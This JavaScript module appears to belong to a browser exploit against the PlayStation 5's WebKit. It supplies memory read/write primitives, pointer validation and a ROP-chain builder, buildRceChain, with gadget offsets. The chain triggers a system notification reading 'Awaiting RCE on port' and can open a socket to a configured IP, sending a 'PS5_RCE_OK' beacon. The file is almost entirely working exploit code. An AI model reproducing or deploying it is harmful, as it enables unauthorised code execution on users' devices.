(function () {
    "use strict";
    if (!window._ds || window._ds.primitives) return;
    var _ds = window._ds;
    var c = _ds.c;
    var buf = _ds.buf;
    var scratchBits = buf.scratchBits;
    var scratchBytes = buf.scratchBytes;
    var scratchWords = buf.scratchWords;
    var scratchDouble = buf.scratchDouble;
    var scanChunk = buf.scanChunk;
    var rwHeader = buf.rwHeader;

    // ── Pure buffer helpers ──────────────────────────────────────────────────

    function buffer(size) {
        return new ArrayBuffer(size);
    }

    function allZero(bytes, start, end) {
        for (var i = start; i < end; ++i) {
            if (bytes[i] !== 0) return false;
        }
        return true;
    }

    function uint32At(bytes, offset) {
        return bytes[offset]
            + bytes[offset + 1] * 0x100
            + bytes[offset + 2] * 0x10000
            + bytes[offset + 3] * 0x1000000;
    }

    function low48At(bytes, offset) {
        return bytes[offset]
            + bytes[offset + 1] * 0x100
            + bytes[offset + 2] * 0x10000
            + bytes[offset + 3] * 0x1000000
            + bytes[offset + 4] * 0x100000000
            + bytes[offset + 5] * 0x10000000000;
    }

    function putLow48(bytes, offset, value) {
        if (!plausibleAddress(value))
            throw new Error("putLow48-invalid-value");
        var high = Math.floor(value / 0x100000000);
        var low = value - high * 0x100000000;
        bytes[offset] = low & 0xff;
        bytes[offset + 1] = Math.floor(low / 0x100) & 0xff;
        bytes[offset + 2] = Math.floor(low / 0x10000) & 0xff;
        bytes[offset + 3] = Math.floor(low / 0x1000000) & 0xff;
        bytes[offset + 4] = high & 0xff;
        bytes[offset + 5] = Math.floor(high / 0x100) & 0xff;
        bytes[offset + 6] = 0;
        bytes[offset + 7] = 0;
    }

    function putQ(bytes, offset, value) {
        if (value === -1) {
            for (var i = 0; i < 8; i++) bytes[offset + i] = 0xff;
            return;
        }
        var hi = Math.floor(value / 0x100000000);
        var lo = value - hi * 0x100000000;
        bytes[offset] = lo & 0xff;
        bytes[offset + 1] = Math.floor(lo / 0x100) & 0xff;
        bytes[offset + 2] = Math.floor(lo / 0x10000) & 0xff;
        bytes[offset + 3] = Math.floor(lo / 0x1000000) & 0xff;
        bytes[offset + 4] = hi & 0xff;
        bytes[offset + 5] = Math.floor(hi / 0x100) & 0xff;
        bytes[offset + 6] = Math.floor(hi / 0x10000) & 0xff;
        bytes[offset + 7] = Math.floor(hi / 0x1000000) & 0xff;
    }

    function low48StoredExactly(bytes, offset, value) {
        return low48At(bytes, offset) === value
            && bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
    }

    function writeString(view, offset, str) {
        for (var i = 0; i < str.length; i++) {
            view[offset + i] = str.charCodeAt(i);
        }
        view[offset + str.length] = 0;
    }

    // ── Carrier operations ───────────────────────────────────────────────────

    function readBytes(destination, source, count) {
        for (var i = 0; i < count; ++i)
            destination[i] = source[i];
    }

    function sameBytes(left, right, count) {
        for (var i = 0; i < count; ++i) {
            if (left[i] !== right[i]) return false;
        }
        return true;
    }

    function readTwiceMatches(destination, source, count) {
        readBytes(destination, source, count);
        return sameBytes(destination, source, count);
    }

    function aimCarrier(candidate, address) {
        var high = Math.floor(address / 0x100000000);
        scratchWords[0] = address - high * 0x100000000;
        scratchWords[1] = high;
        for (var i = 0; i < 8; ++i)
            candidate[0x10 + i] = scratchBytes[i];
    }

    function restoreCarrier(candidate) {
        for (var i = 0; i < 8; ++i)
            candidate[0x10 + i] = rwHeader[0x10 + i];
    }

    // ── Pointer extraction ───────────────────────────────────────────────────

    function pointerFromWords(words, offset) {
        if (words[offset + 3] !== 0) return NaN;
        return words[offset]
            + words[offset + 1] * 0x10000
            + words[offset + 2] * 0x100000000;
    }

    // ── Validation ───────────────────────────────────────────────────────────

    function plausibleCell(value) {
        return value > 0x100000000
            && value <= 0xffffffffffff
            && value <= 9007199254740991
            && Math.floor(value) === value
            && value % 8 === 0;
    }

    function plausibleAddress(value) {
        return value > 0x100000000
            && value <= 0xffffffffffff
            && value <= 9007199254740991
            && Math.floor(value) === value;
    }

    function canonicalLow48(bytes, offset) {
        return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
    }

    function inPS5UserModuleBand(value) {
        return value >= 0x800000000 && value < 0x900000000;
    }

    // ── Import classification ────────────────────────────────────────────────

    function classifyImportedFunction(value, exportOffset, providerTextSize) {
        var s = _ds.s;
        if (value === 0) return 3;
        if (value >= s.webkitBase && value < s.webkitBase + c.WEBKIT_TEXT_SIZE) return 2;
        var providerBase = value - exportOffset;
        if (inPS5UserModuleBand(providerBase)
            && providerBase % 0x4000 === 0
            && providerBase !== s.webkitBase
            && value >= providerBase
            && value < providerBase + providerTextSize)
            return 1;
        return 0;
    }

    function importStatusName(status) {
        if (status === 1) return "RESOLVED";
        if (status === 2) return "UNRESOLVED";
        if (status === 3) return "NULL";
        return "OTHER";
    }

    // ── Hex formatting ───────────────────────────────────────────────────────

    function dumpHex(bytes, count) {
        var out = "";
        for (var i = 0; i < count; ++i)
            out += bytes[i].toString(16).padStart(2, "0");
        return out;
    }

    // ── Header encoding ──────────────────────────────────────────────────────

    function encodedHeaderNumber() {
        var raw = new ArrayBuffer(8);
        var u32 = new Uint32Array(raw);
        var f64 = new Float64Array(raw);
        u32[0] = 0x00004250;
        u32[1] = 0x01062800;
        return f64[0];
    }

    // ── ROP chain builder ────────────────────────────────────────────────────

    function buildRceChain(view, base, kBase) {
        var C = c.RCE_CHAIN_OFFSET;
        var SAFE_W = base + c.RCE_SAFE_W_OFFSET;
        var RBP_SAFE = 0x76ef8b40 + base + 0x1F88;
        var sockAddr = base + c.RCE_SOCKADDR_OFFSET;
        var notifyPath = base + c.RCE_NOTIFY_PATH_OFFSET;
        var notifyBuf = base + c.RCE_NOTIFY_BUF_OFFSET;
        var RCE_MSG_OFFSET = c.RCE_SOCKADDR_OFFSET + 0x10;
        var msgAddr = base + RCE_MSG_OFFSET;

        var RET = kBase + 0xc7;
        var POP_RBP = kBase + 0xc6;
        var POP_RDI = kBase + 0x362f3;
        var POP_RSI = kBase + 0x330aa;
        var POP_RDX = kBase + 0x21a72;
        var POP_RAX = kBase + 0x33e65;
        var POP_RCX = kBase + 0x1aafe;
        var ST_RSI_RAX = kBase + 0x26a8a;
        var S_OPEN = kBase + 0x1b181;
        var S_WRITE = kBase + 0x1aae1;
        var S_CLOSE = kBase + 0x1b7b1;
        var S_SOCKET = kBase + 0x1adc1;
        var S_CONNECT = kBase + 0x1be91;

        // sockaddr_in
        var port = c.RCE_PORT, ip = c.RCE_PC_IP;
        view[c.RCE_SOCKADDR_OFFSET] = 16;
        view[c.RCE_SOCKADDR_OFFSET + 1] = 2;
        view[c.RCE_SOCKADDR_OFFSET + 2] = (port >>> 8) & 0xff;
        view[c.RCE_SOCKADDR_OFFSET + 3] = port & 0xff;
        view[c.RCE_SOCKADDR_OFFSET + 4] = ip[0];
        view[c.RCE_SOCKADDR_OFFSET + 5] = ip[1];
        view[c.RCE_SOCKADDR_OFFSET + 6] = ip[2];
        view[c.RCE_SOCKADDR_OFFSET + 7] = ip[3];
        for (var z = 8; z < 16; z++) view[c.RCE_SOCKADDR_OFFSET + z] = 0;

        // Notification buffer
        writeString(view, c.RCE_NOTIFY_PATH_OFFSET, "/dev/notification0");
        for (var i = 0; i < 0xc30; i++) view[c.RCE_NOTIFY_BUF_OFFSET + i] = 0;
        view[c.RCE_NOTIFY_BUF_OFFSET + 0x10] = 0xff;
        view[c.RCE_NOTIFY_BUF_OFFSET + 0x11] = 0xff;
        view[c.RCE_NOTIFY_BUF_OFFSET + 0x12] = 0xff;
        view[c.RCE_NOTIFY_BUF_OFFSET + 0x13] = 0xff;
        view[c.RCE_NOTIFY_BUF_OFFSET + 0x2c] = 1;
        writeString(view, c.RCE_NOTIFY_BUF_OFFSET + 0x2d, "Awaiting RCE on port " + c.RCE_PORT);
        writeString(view, c.RCE_NOTIFY_BUF_OFFSET + 0x42d, "cxml://psnotification/tex_icon_system");

        // MSG: "PS5_RCE_OK\n"
        var MSG = "PS5_RCE_OK\n";
        for (var mi = 0; mi < MSG.length; mi++) view[RCE_MSG_OFFSET + mi] = MSG.charCodeAt(mi);
        view[RCE_MSG_OFFSET + MSG.length] = 0;
        view[c.RCE_SAFE_W_OFFSET] = 0;

        var ch = [];
        var slot = function (idx) { return base + C + idx * 8; };
        var cdiI, wriI, cloI;

        // sceKernelSendNotificationRequest(device=0, buf, size=0xc30, blocking=0)
        var NOTIFY_EXPORT = kBase + c.NOTIFY_OFFSET;
        ch.push(POP_RDI, 0);
        ch.push(POP_RSI, notifyBuf);
        ch.push(POP_RAX, SAFE_W);
        ch.push(POP_RBP, RBP_SAFE);
        ch.push(POP_RCX, 0);
        ch.push(POP_RAX, SAFE_W);
        ch.push(POP_RBP, RBP_SAFE);
        ch.push(POP_RDX, 0xc30);
        ch.push(NOTIFY_EXPORT);

        // socket + connect + write + close — ONLY with ?pc=1
        if (c.PC_BEACON) {
            ch.push(POP_RDI, 2); ch.push(POP_RSI, 1);
            ch.push(POP_RAX, SAFE_W); ch.push(POP_RBP, RBP_SAFE); ch.push(POP_RDX, 0);
            ch.push(S_SOCKET);
            ch.push(POP_RSI); cdiI = ch.length; ch.push(0); ch.push(ST_RSI_RAX);
            ch.push(POP_RSI); wriI = ch.length; ch.push(0); ch.push(ST_RSI_RAX);
            ch.push(POP_RSI); cloI = ch.length; ch.push(0); ch.push(ST_RSI_RAX);

            ch.push(POP_RDI); var cdi = ch.length; ch.push(0);
            ch.push(POP_RSI, sockAddr); ch.push(POP_RAX, SAFE_W); ch.push(POP_RBP, RBP_SAFE);
            ch.push(POP_RDX, 16); ch.push(S_CONNECT);

            ch.push(POP_RDI); var wri = ch.length; ch.push(0);
            ch.push(POP_RSI, msgAddr); ch.push(POP_RAX, SAFE_W); ch.push(POP_RBP, RBP_SAFE);
            ch.push(POP_RDX, MSG.length); ch.push(S_WRITE);

            ch.push(POP_RDI); var clo = ch.length; ch.push(0); ch.push(S_CLOSE);

            ch[cdiI] = slot(cdi); ch[wriI] = slot(wri); ch[cloI] = slot(clo);
        }

        for (var ci = 0; ci < ch.length; ci++) putQ(view, C + ci * 8, ch[ci]);
        putQ(view, 0x4F8, RET);
        return ch.length;
    }

    // ── Export to namespace ──────────────────────────────────────────────────
    _ds.buffer = buffer;
    _ds.allZero = allZero;
    _ds.uint32At = uint32At;
    _ds.low48At = low48At;
    _ds.putLow48 = putLow48;
    _ds.putQ = putQ;
    _ds.low48StoredExactly = low48StoredExactly;
    _ds.writeString = writeString;
    _ds.readBytes = readBytes;
    _ds.sameBytes = sameBytes;
    _ds.readTwiceMatches = readTwiceMatches;
    _ds.aimCarrier = aimCarrier;
    _ds.restoreCarrier = restoreCarrier;
    _ds.pointerFromWords = pointerFromWords;
    _ds.plausibleCell = plausibleCell;
    _ds.plausibleAddress = plausibleAddress;
    _ds.canonicalLow48 = canonicalLow48;
    _ds.inPS5UserModuleBand = inPS5UserModuleBand;
    _ds.classifyImportedFunction = classifyImportedFunction;
    _ds.importStatusName = importStatusName;
    _ds.dumpHex = dumpHex;
    _ds.encodedHeaderNumber = encodedHeaderNumber;
    _ds.buildRceChain = buildRceChain;
    _ds.primitives = true;
})();
